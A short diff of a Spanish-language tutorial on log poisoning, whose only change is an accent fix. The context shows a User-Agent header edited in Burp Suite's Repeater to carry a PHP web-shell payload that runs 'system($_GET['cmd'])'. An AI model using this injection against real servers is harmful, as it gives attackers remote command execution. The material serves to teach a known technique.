@@ -42,7 +42,7 @@ Una vez dentro de BuroSuite, lo capturamos con la finalidad de que podamos ver e
 Y lo modificaremos en el Repeater
 - User-Agent: Mozilla/5.0 ...
 
-En donde ahi podremos borrar el contenido del User-Agent y colocar codigo php para hacer el envenenamiento (Poisoning)
+En donde ahí podremos borrar el contenido del User-Agent y colocar codigo php para hacer el envenenamiento (Poisoning)
 El codigo php inicia ?php
 - User-agent: <?p system($_GET['cmd']);  ?>
 
